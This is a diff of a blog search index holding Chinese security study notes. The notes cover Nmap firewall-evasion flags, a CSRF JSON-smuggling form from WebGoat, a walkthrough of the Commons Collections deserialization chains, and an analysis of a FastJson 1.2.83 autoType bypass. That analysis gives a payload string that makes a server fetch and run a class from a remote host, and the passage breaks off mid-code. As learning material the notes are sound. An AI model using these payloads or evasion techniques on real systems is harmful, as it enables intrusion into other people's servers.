@@ -31,60 +31,6 @@
       </categories>
   </entry>
   <entry>
-    <title>FireWall</title>
-    <url>/2026/06/10/FireWall/</url>
-    <content><![CDATA[<h3 id="防火墙规避"><a href="#防火墙规避" class="headerlink" title="防火墙规避"></a>防火墙规避</h3><blockquote>
-<p>以下使用的是Nmap</p>
-</blockquote>
-<p><em><strong>控制MAC,IP,端口进行规避</strong></em></p>
-<span id="more"></span>
-
-<p>1.利用诱饵，将自己的IP与其他IP混杂在一起 -D DECOY_IP1,DECOY_IP2,ME</p>
-<p>2.随机诱饵, -D RND,RND,ME</p>
-<p>3.HTTP&#x2F;SOCK4代理 –proxies PROXY_URL</p>
-<p>4.伪造源MAC地址 –spoof-mac MAC_ADDRESS</p>
-<p>5.伪造源IP地址 -S IP_ADDRESS</p>
-<p>6.使用特定的端口号 -g PORT_NUM 或者 –source-port PORT_NUM       </p>
-<p><em><strong>强制分片，MTU，数据长度</strong></em></p>
-<blockquote>
-<p>⚠️  <strong>注意: 分的数据都是数据体的部分，例如IP数据包，由IP首部和传输的数据部分组成，分成8字节只是将传输的数据部分分成8字节，因为没有IP首部就没办法传了。一下1、2、3、4都是如此</strong></p>
-</blockquote>
-<p>1.将IP数据分片成8字节 -f</p>
-<p>2.将IP数据分片成16字节 -ff</p>
-<p>3.使用给定的MTU对数据包进行分片 –mtu VALUE</p>
-<p>4.指定数据包长度 –data-length NUM</p>
-<p><em><strong>修改报头字段进行规避</strong></em></p>
-<p>1.设置IP的ttl –ttl VALUE</p>
-<p>2.发送带有特定IP Options的数据包 –ip-options OPTIONS</p>
-<p>3.发送带有错误TCP&#x2F;UDP校验和的数据包 –badsum</p>
-<p><img src="/2026/06/10/FireWall/firewall1.png" alt="IP头部"></p>
-<p>也就是修改Time to Live和Options</p>
-<p><img src="/2026/06/10/FireWall/firewall2.png" alt="TCP头部"></p>
-<p>改的Checksum</p>
-<p><em><strong>利用端口跳跃</strong></em></p>
-<blockquote>
-<p>我是在tryhackme上学的这部分，没太看懂，下面这个是我文AI知道的。</p>
-</blockquote>
-<p>这是在控制了对方的服务器的情况下，防止因为频繁的流量交流被防火墙检测到。</p>
-<p>端口跳跃就是在防火墙允许的端口间频繁切换(时间很短)，从而防止长时间在固定端口上交流。</p>
-<p>有两种方式</p>
-<p>1.基于时间&#x2F;算法同步</p>
-<p>通信的两端共享一个<strong>密钥</strong>和<strong>时间同步算法</strong>。算法决定“在第 1 毫秒用 5001 端口，第 2 毫秒用 6234 端口，第 3 毫秒用 4012 端口….</p>
-<p>2.敲暗号</p>
-<p>服务端的所有端口默认全部<strong>死死关闭</strong>，防火墙对其显示为 <code>Filtered</code></p>
-<p>客户端在建立真正连接前，必须先向服务端一连串指定的端口发送特定序列的探测包。</p>
-<p>例如暗号是：先踩一下 <code>1111</code>，再踩一下 <code>9999</code>，最后踩一下 <code>5555</code>。</p>
-<p>服务端的内核态（或敲门守护进程）一旦捕捉到这个特定序列的“暗号”，就会临时为这个特定的客户端 IP 开启真正的通信端口。通信完后，立刻再度关闭。也就是说我放进去的后门可以看到流量被拒绝了，一看到一串的特定流量被拒绝了就打开端口。</p>
-<p><em><strong>利用端口隧道</strong></em></p>
-<p>还是控制了对方的服务器的情况下。我想要吧流量送到对方的另一台服务器上，或者是这台受控机器的另一个端口(我们的流量没有办法直接传过去，防火墙挡掉了)。防火墙阻止来自不信任网络的80端口流量，但是8008的流量并未被阻止。我们可以把流量发到受控机器的8008端口，再让他把流量转发给另一个机器或端口。</p>
-<p>后续可能会进行补充</p>
-<p>参考文章:<a href="https://tryhackme.com/room/redteamfirewalls">https://tryhackme.com/room/redteamfirewalls</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-  </entry>
-  <entry>
     <title>学习XXE</title>
     <url>/2026/06/10/XXE/</url>
     <content><![CDATA[<p><em>XML external entity injection</em></p>
@@ -225,6 +171,60 @@
       </categories>
   </entry>
   <entry>
+    <title>FireWall</title>
+    <url>/2026/06/10/FireWall/</url>
+    <content><![CDATA[<h3 id="防火墙规避"><a href="#防火墙规避" class="headerlink" title="防火墙规避"></a>防火墙规避</h3><blockquote>
+<p>以下使用的是Nmap</p>
+</blockquote>
+<p><em><strong>控制MAC,IP,端口进行规避</strong></em></p>
+<span id="more"></span>
+
+<p>1.利用诱饵，将自己的IP与其他IP混杂在一起 -D DECOY_IP1,DECOY_IP2,ME</p>
+<p>2.随机诱饵, -D RND,RND,ME</p>
+<p>3.HTTP&#x2F;SOCK4代理 –proxies PROXY_URL</p>
+<p>4.伪造源MAC地址 –spoof-mac MAC_ADDRESS</p>
+<p>5.伪造源IP地址 -S IP_ADDRESS</p>
+<p>6.使用特定的端口号 -g PORT_NUM 或者 –source-port PORT_NUM       </p>
+<p><em><strong>强制分片，MTU，数据长度</strong></em></p>
+<blockquote>
+<p>⚠️  <strong>注意: 分的数据都是数据体的部分，例如IP数据包，由IP首部和传输的数据部分组成，分成8字节只是将传输的数据部分分成8字节，因为没有IP首部就没办法传了。一下1、2、3、4都是如此</strong></p>
+</blockquote>
+<p>1.将IP数据分片成8字节 -f</p>
+<p>2.将IP数据分片成16字节 -ff</p>
+<p>3.使用给定的MTU对数据包进行分片 –mtu VALUE</p>
+<p>4.指定数据包长度 –data-length NUM</p>
+<p><em><strong>修改报头字段进行规避</strong></em></p>
+<p>1.设置IP的ttl –ttl VALUE</p>
+<p>2.发送带有特定IP Options的数据包 –ip-options OPTIONS</p>
+<p>3.发送带有错误TCP&#x2F;UDP校验和的数据包 –badsum</p>
+<p><img src="/2026/06/10/FireWall/firewall1.png" alt="IP头部"></p>
+<p>也就是修改Time to Live和Options</p>
+<p><img src="/2026/06/10/FireWall/firewall2.png" alt="TCP头部"></p>
+<p>改的Checksum</p>
+<p><em><strong>利用端口跳跃</strong></em></p>
+<blockquote>
+<p>我是在tryhackme上学的这部分，没太看懂，下面这个是我文AI知道的。</p>
+</blockquote>
+<p>这是在控制了对方的服务器的情况下，防止因为频繁的流量交流被防火墙检测到。</p>
+<p>端口跳跃就是在防火墙允许的端口间频繁切换(时间很短)，从而防止长时间在固定端口上交流。</p>
+<p>有两种方式</p>
+<p>1.基于时间&#x2F;算法同步</p>
+<p>通信的两端共享一个<strong>密钥</strong>和<strong>时间同步算法</strong>。算法决定“在第 1 毫秒用 5001 端口，第 2 毫秒用 6234 端口，第 3 毫秒用 4012 端口….</p>
+<p>2.敲暗号</p>
+<p>服务端的所有端口默认全部<strong>死死关闭</strong>，防火墙对其显示为 <code>Filtered</code></p>
+<p>客户端在建立真正连接前，必须先向服务端一连串指定的端口发送特定序列的探测包。</p>
+<p>例如暗号是：先踩一下 <code>1111</code>，再踩一下 <code>9999</code>，最后踩一下 <code>5555</code>。</p>
+<p>服务端的内核态（或敲门守护进程）一旦捕捉到这个特定序列的“暗号”，就会临时为这个特定的客户端 IP 开启真正的通信端口。通信完后，立刻再度关闭。也就是说我放进去的后门可以看到流量被拒绝了，一看到一串的特定流量被拒绝了就打开端口。</p>
+<p><em><strong>利用端口隧道</strong></em></p>
+<p>还是控制了对方的服务器的情况下。我想要吧流量送到对方的另一台服务器上，或者是这台受控机器的另一个端口(我们的流量没有办法直接传过去，防火墙挡掉了)。防火墙阻止来自不信任网络的80端口流量，但是8008的流量并未被阻止。我们可以把流量发到受控机器的8008端口，再让他把流量转发给另一个机器或端口。</p>
+<p>后续可能会进行补充</p>
+<p>参考文章:<a href="https://tryhackme.com/room/redteamfirewalls">https://tryhackme.com/room/redteamfirewalls</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CSRF 跨站请求伪造详解</title>
     <url>/2026/06/09/csrf/</url>
     <content><![CDATA[<p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p>
@@ -239,9 +239,9 @@
 <li>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 a.com 执行了自己定义的操作。</li>
 </ul>
 <p>这个第三方网站就是自己配置的恶意网站。<br><img src="/2026/06/09/csrf/csrf.png" alt="我的本地截图"><br>差不多就是这样的。也就是第三方网站像目标网站发送请求。<br>把自己想干的事情通过参数穿过去就好了。</p>
-<p>如果对方后端只接受json数据，那怎么传呢？<br>json数据长这样<br>{<br>“name”: “WebGoat”,<br>“email”: “<a href="mailto:&#119;&#101;&#98;&#x67;&#x6f;&#97;&#x74;&#x40;&#x77;&#x65;&#x62;&#x67;&#111;&#97;&#116;&#x2e;&#x6f;&#x72;&#x67;">webgoat@webgoat.org</a>“,<br>“content”: “WebGoat is the best!!”<br>}</p>
+<p>如果对方后端只接受json数据，那怎么传呢？<br>json数据长这样<br>{<br>“name”: “WebGoat”,<br>“email”: “<a href="mailto:&#119;&#101;&#x62;&#103;&#111;&#x61;&#116;&#64;&#119;&#x65;&#x62;&#x67;&#x6f;&#x61;&#116;&#46;&#111;&#x72;&#103;">webgoat@webgoat.org</a>“,<br>“content”: “WebGoat is the best!!”<br>}</p>
 <p>普通的 HTML <form> 表单提交时，默认的数据格式是 application&#x2F;x-www-form-urlencoded（即 key1&#x3D;value1&amp;key2&#x3D;value2）。如果你在表单里老老实实写 <code>&lt;input name=&quot;name&quot; value=&quot;WebGoat&quot;&gt;</code>，后端一收到，发现不是标准的 JSON 格式，就会直接报 415 Unsupported Media Type 错误并拒绝处理。<br>也就是说上面的input标签里的会变成name&#x3D;WebGoat，很显然这不是我们想要。<br>但是，我们可以调整一下我们的数据。举个例子:<br><input name= ' {"name": "WebGoat", "email": "webgoat@webgoat.org", "content": "WebGoat is the best!!", "ignore_me":" ' value='test"}' type='hidden'></p>
-<p>{“name”: “WebGoat”, “email”: “<a href="mailto:&#x77;&#x65;&#x62;&#x67;&#x6f;&#97;&#116;&#64;&#119;&#101;&#98;&#x67;&#111;&#97;&#116;&#x2e;&#111;&#114;&#x67;">webgoat@webgoat.org</a>“, “content”: “WebGoat is the best!!”, “ignore_me”:”这是一部分<br>test”}这是一部分<br>通过&#x3D;拼接<br>{“name”: “WebGoat”, “email”: “<a href="mailto:&#119;&#101;&#98;&#103;&#x6f;&#x61;&#x74;&#x40;&#x77;&#x65;&#98;&#x67;&#x6f;&#97;&#x74;&#x2e;&#x6f;&#x72;&#103;">webgoat@webgoat.org</a>“, “content”: “WebGoat is the best!!”, “ignore_me”:”&#x3D;test”}<br>可以看到我们传过去的数据成为json格式了<br>单引号和双引号是同级的，他看到是‘开始的会以’结束。</p>
+<p>{“name”: “WebGoat”, “email”: “<a href="mailto:&#119;&#101;&#98;&#x67;&#111;&#x61;&#116;&#64;&#x77;&#101;&#98;&#103;&#x6f;&#x61;&#x74;&#x2e;&#x6f;&#x72;&#x67;">webgoat@webgoat.org</a>“, “content”: “WebGoat is the best!!”, “ignore_me”:”这是一部分<br>test”}这是一部分<br>通过&#x3D;拼接<br>{“name”: “WebGoat”, “email”: “<a href="mailto:&#119;&#x65;&#x62;&#x67;&#x6f;&#97;&#x74;&#x40;&#x77;&#x65;&#98;&#x67;&#x6f;&#x61;&#116;&#x2e;&#111;&#114;&#x67;">webgoat@webgoat.org</a>“, “content”: “WebGoat is the best!!”, “ignore_me”:”&#x3D;test”}<br>可以看到我们传过去的数据成为json格式了<br>单引号和双引号是同级的，他看到是‘开始的会以’结束。</p>
 <p>参考文章:</p>
 <p><a href="https://drun1baby.top/2022/05/08/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1CSRF/">https://drun1baby.top/2022/05/08/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1CSRF/</a></p>
 <p>不定时会进行补充</p>
@@ -254,6 +254,50 @@
         <tag>CSRF</tag>
         <tag>前端安全</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>CC</title>
+    <url>/2026/09/14/cc/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做一些简单的总结</p>
+<span id="more"></span>
+
+<h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><blockquote>
+<p>&lt;jdk8u71</p>
+</blockquote>
+<p><code>InvokerTransformer.transform(Object input)</code>主要是这个transfomer的问题，这个方法可以执行任意类的任意方法。然后找从入口走到这个方法的路子。</p>
+<p><code>LazyMap.get(Object key)</code>这里有<code>factory.transform(key)</code>，factory可控。</p>
+<p>入口是<code>AnnotationInvocationHandler.readObject(java.io.ObjectInputStream s)</code>这里有<code>memberValue.setValue()</code>，<code>AnnotationInvocationHandler</code>中有Map属性，这个就是反序列化这个Map为其赋值的过程。</p>
+<p>需要把这三个连起来，这里用到了代理，调用代理对象的方法的时候都会经过<code>handler</code>的<code>invoke</code>方法的中转。</p>
+<p><code>AnnotationInvocationHandler.invoke(Object proxy, Method method, Object[] args)</code>有<code>memberValues.get(member)</code>，这样就能用上<code>LazyMap.get(Object key)</code>，代理<code>LazyMap</code>，封装到<code>AnnotationInvocationHandler</code>。</p>
+<p>还有一个问题是<code>Runtime</code>，<code>Runtime</code>不能序列化。解决方案是反序列化时获取对方上下文中的<code>Runtime</code>，这涉及到<code>ChainedTransformer</code>他的transform方法会链式调用transformer数组的transform方法。</p>
+<p><strong>修复</strong></p>
+<p>8u71版本进行了修复<code>AnnotationInvocationHandler.readObject(java.io.ObjectInputStream s)</code>不再反序列化<code>Map</code>而是创建<code>HashMap</code>后赋值</p>
+<h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><p>解决了高版本不能用的问题，既然是入口点被修了那就换个入口点。</p>
+<p>找的另一个走到<code>LazyMap.get(Object key)</code>。</p>
+<p><code>TiedMapEntry.getValue()</code>这里有<code>map.get(key)</code>，<code>TiedMapEntry.hashCode()</code>又会调用<code>getValue()</code>，想一些跟哈希有关的。</p>
+<p><code>HashMap.readObject(java.io.ObjectInputStream s)</code>有<code>putVal(hash(key), key, value, false, false)</code>，所以改成这个入口。</p>
+<p>这里有一个提前触发的问题，<code>HashMap</code>的put方法也会调用putVal因为我们要往key中添加<code>TiedMapEntry</code>，这个链被提前触发了。处理办法是<code>LazyMap</code>中先放不会触发漏洞的transformer，然后用反射改为我们特意准备的transformer。不过这样的话<code>LazyMap.get(Object key)</code>还是会被触发，所以这个key被放到了Map这样的话get方法的if判断过不去，所以还得从map当中remove</p>
+<h3 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h3><p>这个主要是为了处理<code>InvokerTransformer</code>进到黑名单的情况。</p>
+<p>这个是通过字节码加载的，这就涉及到<code>TemplatesImpl</code>这个类就是加载字节码的核心，调用上<code>TemplatesImpl.newTransformer()</code>就加载字节码了。直到<code>LazyMap</code>还是CC1的部分。为了不走<code>InvokerTransformer</code>，这涉及两个类<code>TrAXFilter</code>和<code>InstantiateTransformer</code>，<code>TrAXFilter</code>的构造方法会调用<code>templates.newTransformer()</code>，而<code>InstantiateTransformer.transform(Object input)</code>会调用构造方法，把这些连起来就好了。</p>
+<p>前半部分也可以走CC6，从而摆脱jdk版本限制。</p>
+<h3 id="CC2-CC4"><a href="#CC2-CC4" class="headerlink" title="CC2,CC4"></a>CC2,CC4</h3><blockquote>
+<p>Commons.collection4</p>
+</blockquote>
+<p>CC4就是改了入口点的CC3。</p>
+<p><code>PriorityQueue</code>这个的特点是涉及到排序，这就需要进行比较，用于比较的比较器是可以传的。</p>
+<p><code>TransformingComparator.compare(final I obj1, final I obj2)</code>有<code>this.transformer.transform(obj1)</code>，这样就走通了。</p>
+<p>CC2在CC4的基础上没有使用transformer数组，改为直接使用<code>InvokerTransformer</code>来调用<code>templates.newTransformer()</code></p>
+<h3 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h3><p>更改了入口点的CC1</p>
+<p>涉及<code>BadAttributeValueExpException。readObject(ObjectInputStream ois)</code>最大的特点就是任意类的toString()调用。</p>
+<p><code>TiedMapentry.toString()</code>调用<code>getValue</code>这样就走到<code>LazyMap</code>了。</p>
+<h3 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h3><p>更改了入口点的CC1</p>
+<p>涉及<code>HashTable</code>和<code>AbstractMap</code>。</p>
+<p><code>Hashtable.readObject(java.io.ObjectInputStream s)</code>会调用<code>reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)</code>，这个方法里面如果发生哈希冲突会调用equals方法。</p>
+<p><code>&quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode()</code>因为哈希值相同会用<code>equals</code>方法来比较，而<code>AbstractMap.equals(Object o)</code>他会调用map的get方法这样就能走到<code>LazyMap</code>了。由于<code>HashTable</code>的put也会有哈希冲突的情况，这样就提前触发链子了，和CC6一样<code>LazyMap</code>中放了不在预期中的值，这样反序列化时<code>hashcode</code>就不同了，所以还要remove。</p>
+]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
   </entry>
   <entry>
     <title>EL表达式</title>
@@ -496,6 +540,47 @@
       </categories>
   </entry>
   <entry>
+    <title>FastJson1.2.83</title>
+    <url>/2026/09/17/fj1283/</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>因为是第一次复现这么新的漏洞，专门整一篇文章记录一下。</p>
+<span id="more"></span>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><blockquote>
+<p>Jdk8 fastjson1.2.83</p>
+</blockquote>
+<p><code>{&quot;@type&quot;:&quot;jar:http:..2130706433:9000.probe!.POC&quot;,&quot;x&quot;:1}</code>网上看的利用的字符串是这样子的。</p>
+<p>还是要绕过checkAutoType()，绕过的点在下面这部分。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">jsonType</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (defaultClassLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">            is = defaultClassLoader.getResourceAsStream(resource);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(is, <span class="literal">true</span>);</span><br><span class="line">            <span class="type">TypeCollector</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeCollector</span>(<span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">            classReader.accept(visitor);</span><br><span class="line">            jsonType = visitor.hasJsonType();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        IOUtils.close(is);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>getResourceAsStream(resource)</code>这个方法中的resource是一个资源名，他会根据资源名获取资源的流。这个resource如果是URL的话就回去这个URL获取资源。typeName是@type后面跟着的类名，这是可控的，也就是说将类名写成URL就可以了。由于IP地址中的.会被替换为&#x2F;，要把地址写成十进制形式。</p>
+<p>还有一个疑问是为什么使用jar协议，纯用HTTP也是可以的，纯HTTP的时候会多一个发送HEAD请求的过程，这个HEAD请求通过HTTP状态吗检测目标服务器中是否存在所求资源，如果返回40X，50X的话这个请求过程直接就中断了，而jar协议没有这个过程会稳定一点。</p>
+<p>is就是POC.class对应的流，is不为空时会检查POC.class中有没有jsonType，有jsonType的话就能通过<code>TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass)</code>的if判断的检测了。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有两处获取类加载器的位置，第一个是获取默认类加载器通常为null，另一个获取当前线程上下文的类加载器。这里是关键，我们希望此时获取的类加载器是<code>LaunchedURLClassLoader</code>，因为只有这个类加载器会把我们传进去的className当做URL处理，这样才能把远程POC.class加载进来。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoader</span> <span class="keyword">extends</span> <span class="title class_">SecureClassLoader</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span>&#123;</span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(<span class="keyword">final</span> String name)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt; result;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        result = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Class&lt;?&gt;&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Class&lt;?&gt; run() <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>);</span><br><span class="line">                    <span class="type">Resource</span> <span class="variable">res</span> <span class="operator">=</span> ucp.getResource(path, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> defineClass(name, res);</span><br><span class="line">                        &#125; </span><br><span class="line">                      ...</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后会到这里defineClass(name,res)，这个name是我们传进来的typeName，也就是说POC.class这个类的名字得跟typeName一样，又因为会把.处理为&#x2F;，所以类名得是<code>jar:http://2130706433:9000/probe!/POC</code>，然后发现idea上写不了这种类名，这需要ASM这种字节码工具把.class文件的this_class改为这种形式。</p>
+<p>后面就是获取反序列化器反序列化的过程，这时有类的实例化，进而触发我们的静态代码块。</p>
+<p>类加载的缓存问题，由于类的初始化只会进行一次，加载过的类会在缓存当中，所以这个json字符串发送并且类加载成功的话就不能再用了，下次发送同样的json字符串时会因为缓存不再进行类的初始化，当然改个名就好了。</p>
+<p><em><strong>类加载器</strong></em></p>
+<p>单独讨论一下类加载器的问题</p>
+<p>在IDEA里直接run的时候时AppClassLoader，以fat jar运行的时候时LaunchedURLClassLoader，而这个漏洞要想使用还得用LaunchedURLClassLoader，所以只能用fat jar的方式。<code>TypeUtils.loadClass()</code>用的是当前上下文的类加载器，这又涉及到这个线程是谁创建的问题。为了方便我在复现的时候是按Controller接收json以及配置<code>TypeUtils.loadClass()</code>的默认类加载器为LaunchedURLClassLoader。</p>
+<p>为什么LaunchedURLClassLoader就回去这个URL地址获取资源呢，这个类加载器的加载类的方法最终还是走的URLClassLoader的方法，然后会走到URLClassPath，这是每一个URLClassLoader都会有的，说白了他保存着类加载器寻找类的根地址，它会根据这个根地址去加载类，保存在URLClassPath的urls里面称为条目。在这两次获取资源的流程中会分别调用URLClassLoader的findResource()和findClass()，进而走到URLClassPath的findResource()和getResource()。然后走到最为核心的getLoader()。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Resource <span class="title function_">getResource</span><span class="params">(String name, <span class="type">boolean</span> check)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;URLClassPath.getResource(\&quot;&quot;</span> + name + <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Loader loader;</span><br><span class="line">        <span class="type">int</span>[] cache = getLookupCache(name);</span><br><span class="line">  <span class="comment">//getNextLoader会调用到getLoader()</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; (loader = getNextLoader(cache, i)) != <span class="literal">null</span>; i++) &#123;</span><br><span class="line">            <span class="type">Resource</span> <span class="variable">res</span> <span class="operator">=</span> loader.getResource(name, check);</span><br><span class="line">            <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span> Loader <span class="title function_">getLoader</span><span class="params">(<span class="keyword">final</span> URL url)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> java.security.AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Loader&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Loader <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> url.getFile();</span><br><span class="line">                <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.endsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&quot;file&quot;</span>.equals(url.getProtocol())) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FileLoader</span>(url);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(url);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JarLoader</span>(url, jarHandler, lmap);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">        <span 